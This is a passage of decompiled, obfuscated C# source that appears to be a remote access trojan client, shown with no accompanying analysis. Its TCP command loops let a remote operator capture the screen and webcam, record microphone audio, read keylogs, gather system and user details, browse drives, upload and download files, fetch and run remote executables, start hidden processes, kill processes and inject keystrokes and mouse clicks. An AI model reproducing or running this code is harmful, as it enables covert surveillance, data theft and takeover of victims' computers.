			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					YGfmWIyWpK114();
					UCIidqfxf80.WriteLine("/ERROR/");
					UCIidqfxf80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void UOGWZi3qikE9WF174(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
				string text = array.GetValue(1)!.ToString();
				string text2 = array.GetValue(0)!.ToString();
				if (!Directory.Exists(text2))
				{
					Directory.CreateDirectory(text2);
				}
				string[] array2 = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(array.GetValue(2), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array3 = new byte[array2.GetUpperBound(0) + 1];
				int num = array2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array3[i] = Conversions.ToByte(array2.GetValue(i));
				}
				if (array2.Length < 32768)
				{
					string_2 = text2 + text;
					if (File.Exists(string_2))
					{
						uqpHzbxjkt122(1);
						try
						{
							File.Delete(string_2);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							try
							{
								uqpHzbxjkt122(1);
								T2G0jpvQriyo40.Flush();
								T2G0jpvQriyo40.Close();
								OzyeBEsaWJxz41.Close();
								File.Delete(string_2);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								try
								{
									uqpHzbxjkt122(1);
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									File.Delete(string_2);
									ProjectData.ClearProjectError();
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					T2G0jpvQriyo40 = new FileStream(string_2, FileMode.CreateNew);
					OzyeBEsaWJxz41 = new BinaryWriter(T2G0jpvQriyo40);
					H3plzYvXsMtH38 = new byte[array2.Length - 1 + 1];
					H3plzYvXsMtH38 = array3;
					OzyeBEsaWJxz41.Write(H3plzYvXsMtH38);
					T2G0jpvQriyo40.Flush();
					T2G0jpvQriyo40.Close();
					OzyeBEsaWJxz41.Close();
					return;
				}
				string_2 = text2 + text;
				if (File.Exists(string_2))
				{
					uqpHzbxjkt122(1);
					try
					{
						File.Delete(string_2);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						try
						{
							uqpHzbxjkt122(1);
							T2G0jpvQriyo40.Flush();
							T2G0jpvQriyo40.Close();
							OzyeBEsaWJxz41.Close();
							File.Delete(string_2);
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							try
							{
								uqpHzbxjkt122(1);
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								File.Delete(string_2);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
				}
				T2G0jpvQriyo40 = new FileStream(string_2, FileMode.CreateNew);
				OzyeBEsaWJxz41 = new BinaryWriter(T2G0jpvQriyo40);
				H3plzYvXsMtH38 = new byte[array2.Length - 1 + 1];
				H3plzYvXsMtH38 = array3;
				OzyeBEsaWJxz41.Write(H3plzYvXsMtH38);
				T2G0jpvQriyo40.Flush();
				UCIidqfxf80.WriteLine("/ANOTHEPK/");
				UCIidqfxf80.Flush();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				try
				{
					T2G0jpvQriyo40.Flush();
					T2G0jpvQriyo40.Close();
					OzyeBEsaWJxz41.Close();
					UCIidqfxf80.WriteLine("/ERRORUPL/");
					UCIidqfxf80.Flush();
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void j2nRy5floQ4Ju1175(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array2 = new byte[array.GetUpperBound(0) + 1];
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array2[i] = Conversions.ToByte(array.GetValue(i));
				}
				H3plzYvXsMtH38 = new byte[array.Length - 1 + 1];
				H3plzYvXsMtH38 = array2;
				OzyeBEsaWJxz41.Write(H3plzYvXsMtH38);
				T2G0jpvQriyo40.Flush();
				UCIidqfxf80.WriteLine("/ANOTHEPK/");
				UCIidqfxf80.Flush();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					T2G0jpvQriyo40.Flush();
					T2G0jpvQriyo40.Close();
					OzyeBEsaWJxz41.Close();
					UCIidqfxf80.WriteLine("/ERRORUPL/");
					UCIidqfxf80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void YixdBoICeIfWTY176(object Tempdata)
	{
		checked
		{
			try
			{
				if (Operators.ConditionalCompareObjectNotEqual(Tempdata, (object)"", false))
				{
					string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
					byte[] array2 = new byte[array.GetUpperBound(0) + 1];
					int num = array.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						array2[i] = Conversions.ToByte(array.GetValue(i));
					}
					H3plzYvXsMtH38 = new byte[array.Length - 1 + 1];
					H3plzYvXsMtH38 = array2;
					OzyeBEsaWJxz41.Write(H3plzYvXsMtH38);
					T2G0jpvQriyo40.Flush();
					T2G0jpvQriyo40.Close();
					OzyeBEsaWJxz41.Close();
				}
				else
				{
					T2G0jpvQriyo40.Flush();
					T2G0jpvQriyo40.Close();
					OzyeBEsaWJxz41.Close();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					T2G0jpvQriyo40.Flush();
					T2G0jpvQriyo40.Close();
					OzyeBEsaWJxz41.Close();
					UCIidqfxf80.WriteLine("/ERRORUPL/");
					UCIidqfxf80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetMessageExtraInfo();

	private void pQSfO1s0NrxyXG178(object Tempdata)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"right", false))
			{
				mouse_event(8, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(16, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"left", false))
			{
				mouse_event(2, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(4, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"middle", false))
			{
				mouse_event(32, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(64, 0, 0, 0, (int)GetMessageExtraInfo());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OEBBbgsZ9fG2V7179(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { '*' }, (string[])null, (Type[])null, (bool[])null);
				int x = (int)Math.Round(Math.Floor(double.Parse(array[0])));
				int y = (int)Math.Round(Math.Floor(double.Parse(array[1])));
				ref Point reference = ref zSXBXdRArTNp52;
				reference = new Point(x, y);
				Cursor.set_Position(zSXBXdRArTNp52);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void JAcytadnQZ8RwS180()
	{
		try
		{
			if (rf3x912)
			{
				string lpstrCommand = "open new type waveaudio alias capture";
				string lpstrReturnString = null;
				mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
				lpstrReturnString = "set capture samplespersec 6000 channels 8 bitspersample 1 alignment 1 bytespersec 6000";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "record capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				uqpHzbxjkt122(5);
				lpstrReturnString = "save capture test.wav";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "close capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				try
				{
					isdSfdsAR70.WriteLine("/SOUNDREC/" + Convert.ToBase64String(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().ReadAllBytes("test.wav")));
					isdSfdsAR70.Flush();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().DeleteFile(Application.get_StartupPath() + "\\test.wav");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Bfguvp2VlpRE5p181(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			if (!Directory.Exists(array.GetValue(0)!.ToString()))
			{
				Directory.CreateDirectory(array.GetValue(0)!.ToString());
			}
			if (!File.Exists(array.GetValue(0)!.ToString() + text))
			{
				string text2 = array.GetValue(2)!.ToString();
				((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Network().DownloadFile(text2, array.GetValue(0)!.ToString() + text, (string)null, (string)null, false, 100000, true);
				uqpHzbxjkt122(5);
			}
			int num = 0;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.StartsWith("winupdate"))
				{
					num = 1;
				}
			}
			if (num == 0)
			{
				Process.Start(array.GetValue(0)!.ToString() + text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void HCyL5lgdeZ4Mtq182(object Tempdata)
	{
		try
		{
			SendKeys.SendWait(Conversions.ToString(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void NCsjKzoTYbxw4N183()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		try
		{
			PdjzFYpsa57 = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = PdjzFYpsa57.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					object current = enumerator.get_Current();
					mO8tbY4Ce58 = NewLateBinding.LateIndexGet(current, new object[1] { "manufacturer" }, (string[])null).ToString();
					MqGrtTlmR59 = NewLateBinding.LateIndexGet(current, new object[1] { "model" }, (string[])null).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = null;
			text = "/INFOPCPC/";
			text = text + "Computer Name = " + ((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Name() + "±";
			text = text + "Computer Manufacturer = " + Manufacturer + "±";
			text = text + "Computer Model = " + Model + "±";
			text = text + "OS Name = " + ((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Info().get_OSFullName() + "±";
			text = text + "OS Version = " + ((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Info().get_OSVersion() + "±";
			text = text + "System Type = " + ((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Info().get_OSPlatform() + "±";
			text = text + "Total Physical Memory = " + Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Info().get_TotalPhysicalMemory()) + "±";
			text = text + "Total Virtual Memory = " + Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Info().get_TotalVirtualMemory()) + "±";
			text = text + "Available Physical Memory = " + Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Info().get_AvailablePhysicalMemory()) + "±";
			text = text + "Available Virtual Memory = " + Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Info().get_AvailableVirtualMemory()) + "±";
			text = text + "Username = " + PTvGBbzg8wJXkDlSAlonMk2.User.get_Name() + "±";
			text = text + "System Directory = " + Environment.SystemDirectory;
			t3kID8CF3C2xcIew85.WriteLine(text);
			t3kID8CF3C2xcIew85.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void eNGP4NGermMaBn184(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().WriteAllText(Path.GetTempPath() + "logdll.txt", "", false);
				return;
			}
			string text = ((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_FileSystem().ReadAllText(Path.GetTempPath() + "logdll.txt");
			if (text.Length > 2000000)
			{
				text = v6pJR2A5qz112("Log file too big", "&%#@?,:*");
				SgSByH0l3MEab125.WriteLine("/KEYSLOGG/" + text);
				SgSByH0l3MEab125.Flush();
			}
			else
			{
				text = v6pJR2A5qz112(text, "&%#@?,:*");
				SgSByH0l3MEab125.WriteLine("/KEYSLOGG/" + text);
				SgSByH0l3MEab125.Flush();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_14(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				string lpstrCommand = "Set CDaudio door open";
				mciExecute(ref lpstrCommand);
			}
			else
			{
				string lpstrCommand = "Set CDaudio door closed";
				mciExecute(ref lpstrCommand);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DmezhsYqieHGJz186(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void a5xzY0RHLOArGv187(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void R8WzMSA47cT8pA188(object Tempdata)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			string text = null;
			EncoderParameters val = new EncoderParameters(1);
			val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
			ImageCodecInfo val2 = SEjDuRfgKU106("image/jpeg");
			int num = int.Parse(array[1]);
			int num2 = 0;
			Bitmap val3 = new Bitmap(AgdpdbADNmzn53.Width, AgdpdbADNmzn53.Height, (PixelFormat)135173);
			if (AgdpdbADNmzn53.Width < num)
			{
				num = AgdpdbADNmzn53.Width;
			}
			switch (num)
			{
			case 1280:
				num2 = 1024;
				break;
			case 1024:
				num2 = 768;
				break;
			case 800:
				num2 = 600;
				break;
			case 640:
				num2 = 480;
				break;
			case 320:
				num2 = 240;
				break;
			}
			Bitmap val4 = new Bitmap(num, num2, (PixelFormat)135173);
			Graphics val5 = Graphics.FromImage((Image)(object)val3);
			val5.CopyFromScreen(AgdpdbADNmzn53.X, AgdpdbADNmzn53.Y, 0, 0, AgdpdbADNmzn53.Size, (CopyPixelOperation)13369376);
			val5 = Graphics.FromImage((Image)(object)val4);
			val5.set_InterpolationMode((InterpolationMode)7);
			val5.set_CompositingQuality((CompositingQuality)2);
			val5.DrawImage((Image)(object)val3, 0, 0, num, num2);
			MemoryStream memoryStream = new MemoryStream();
			if (Conversions.ToDouble(array[0]) > 75.0)
			{
				((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
			}
			else
			{
				((Image)val4).Save((Stream)memoryStream, val2, val);
			}
			memoryStream.Capacity = checked((int)memoryStream.Length);
			byte[] buffer = memoryStream.GetBuffer();
			text = Convert.ToBase64String(buffer);
			_ = text.Length;
			((Image)val3).Dispose();
			((Image)val4).Dispose();
			memoryStream.Dispose();
			memoryStream.Close();
			val5.Dispose();
			buffer = null;
			isdSfdsAR70.WriteLine("/STARDESK/" + text);
			isdSfdsAR70.Flush();
			text = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Zb0fSxyQ0jxZWW189(object Tempdata)
	{
		try
		{
			int processId = int.Parse(Conversions.ToString(Tempdata));
			Process processById = Process.GetProcessById(processId);
			try
			{
				if (processById != null)
				{
					processById.Kill();
					QyB2pDIjA5KZpJpmNSiL135.WriteLine("/REFRESHP/");
					QyB2pDIjA5KZpJpmNSiL135.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					Process.EnterDebugMode();
					processById.Kill();
					Process.LeaveDebugMode();
					QyB2pDIjA5KZpJpmNSiL135.WriteLine("/REFRESHP/");
					QyB2pDIjA5KZpJpmNSiL135.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void BqYPMsz9i8TRZ6190(object Tempdata)
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.SpVoice", ""));
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool YkGPBgIzNlz9X0191(string addrrr)
	{
		bool flag = false;
		try
		{
			string pattern = "^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$";
			Regex regex = new Regex(pattern);
			flag = Operators.CompareString(addrrr, "", false) != 0 && regex.IsMatch(addrrr, 0);
			return flag;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = flag;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_15()
	{
		string text = null;
		try
		{
			while (rtsjTeTgv68.Connected)
			{
				text = qV4kjI6BX71.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/DOWNDESK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread7 = new Thread(R8WzMSA47cT8pA188);
						thread7.Start(text);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSQL/":
					try
					{
						isdSfdsAR70.WriteLine("/STARTSQL/" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Width) + "*" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Height));
						isdSfdsAR70.Flush();
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SENDKEYB/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread6 = new Thread(HCyL5lgdeZ4Mtq182);
						thread6.Start(text);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SETMOUSE/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread5 = new Thread(OEBBbgsZ9fG2V7179);
					thread5.Start(text);
					break;
				}
				case "/SETCLICK/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread4 = new Thread(pQSfO1s0NrxyXG178);
					thread4.Start(text);
					break;
				}
				case "/STARTSQN/":
					try
					{
						bool_0 = true;
						isdSfdsAR70.WriteLine("/STARTSQN/");
						isdSfdsAR70.Flush();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEQ/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(y8LcO4jxpr3uNEF4G152);
						thread3.Start(text);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEF/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(NTrtxGtcNKDweajk3153);
						thread2.Start(text);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPPSEQ/":
					try
					{
						bool_0 = false;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPDESK/":
					try
					{
						bool_0 = false;
						isdSfdsAR70.Dispose();
						qV4kjI6BX71.Dispose();
						Qe9NnM2ba69.Dispose();
						rtsjTeTgv68.Close();
						return;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDREC/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						rf3x912 = true;
						Thread thread = new Thread(JAcytadnQZ8RwS180);
						thread.Start();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDSTP/":
					try
					{
						rf3x912 = false;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					try
					{
						isdSfdsAR70.WriteLine("/STARDESK/");
						isdSfdsAR70.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
	}

	private void TSm1yrSFDIoFd1193()
	{
		string text = null;
		checked
		{
			try
			{
				while (tcpClient_1.Connected)
				{
					text = Pc90QV1r376.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						uqpHzbxjkt122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/WEBLISTC/":
						try
						{
							string lpszName = Strings.Space(100);
							string lpszVer = Strings.Space(100);
							int num = 0;
							StringBuilder stringBuilder = new StringBuilder();
							bool flag;
							do
							{
								if (flag = capGetDriverDescriptionA((short)num, ref lpszName, 100, ref lpszVer, 100))
								{
									stringBuilder.Append(lpszName.Trim() + "¦");
								}
								num++;
							}
							while (flag);
							qvUqHLPez75.WriteLine("/WEBLISTC/" + stringBuilder.ToString());
							qvUqHLPez75.Flush();
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTART/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							ZSbMq20 = "Connect";
							string_0 = "";
							thread_3 = new Thread(method_7);
							thread_3.Start(text);
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBIMAGA/":
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						string text2 = text;
						if (Operators.CompareString(text2, "0", false) == 0)
						{
							QIGwaut166 = true;
						}
						else if (Operators.CompareString(text2, "1", false) == 0)
						{
							iHoXiV2167 = true;
						}
						break;
					}
					case "/WEBIMAGE/":
						try
						{
							switch (Strings.Mid(text, 11, Strings.Len(text)))
							{
							case "Image":
								jjJf521 = "Image";
								break;
							case "Capture":
								jjJf521 = "Capture";
								break;
							case "Capture2":
								jjJf521 = "Capture2";
								break;
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTOPP/":
						try
						{
							QIGwaut166 = false;
							iHoXiV2167 = false;
							jjJf521 = "";
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBDISCO/":
						try
						{
							QIGwaut166 = false;
							iHoXiV2167 = false;
							jjJf521 = null;
							string_0 = "Disconnect";
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDESK/":
						try
						{
							QIGwaut166 = false;
							iHoXiV2167 = false;
							jjJf521 = null;
							string_0 = "Disconnect";
							qvUqHLPez75.Dispose();
							Pc90QV1r376.Dispose();
							CydfRjnsl74.Dispose();
							tcpClient_1.Close();
							return;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						uqpHzbxjkt122(1);
						try
						{
							qvUqHLPez75.WriteLine("/WEBLISTC/");
							qvUqHLPez75.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void CCgCvz0G66UkEg194()
	{
		string text = null;
		checked
		{
			try
			{
				while (KyK1HQRAP78.Connected)
				{
					text = nsmaMcI4FOOuj8f581.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						uqpHzbxjkt122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text4 = null;
								if (val2 != null)
								{
									double num2 = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num3 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num3), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num2), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text4 = Convert.ToBase64String(buffer);
									UCIidqfxf80.WriteLine("/IPREVIEW/" + text4);
									UCIidqfxf80.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError13)
							{
								ProjectData.SetProjectError(projectError13);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError14)
						{
							ProjectData.SetProjectError(projectError14);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDOWN/":
						try
						{
							YGfmWIyWpK114();
						}
						catch (Exception projectError12)
						{
							ProjectData.SetProjectError(projectError12);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread10 = new Thread(mrbYpa26Y3OYky163);
							thread10.Start(UCIidqfxf80);
						}
						catch (Exception projectError11)
						{
							ProjectData.SetProjectError(projectError11);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread9 = new Thread(ESPiSjryyNSFvX164);
							thread9.Start(text);
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							UCIidqfxf80.WriteLine("/ERRORDIR/");
							UCIidqfxf80.Flush();
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread8 = new Thread(jJW26N2Ex8c2JC171);
